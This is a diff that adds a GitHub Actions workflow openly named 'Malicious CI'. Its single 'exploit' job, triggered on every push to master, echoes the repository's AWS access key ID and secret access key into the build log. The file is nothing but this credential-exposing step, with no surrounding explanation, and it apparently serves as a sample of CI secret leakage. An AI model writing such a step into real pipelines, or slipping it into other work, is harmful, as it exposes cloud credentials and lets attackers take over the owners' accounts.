@@ -1,0 +1,15 @@
+name: Malicious CI
+
+on:
+  push:
+    branches:
+      - master
+
+jobs:
+  exploit:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Echo AWS Keys
+        run: |
+          echo "ACCESS: ${{ secrets.AWS_ACCESS_KEY_ID }}"
+          echo "SECRET: ${{ secrets.AWS_SECRET_ACCESS_KEY }}"
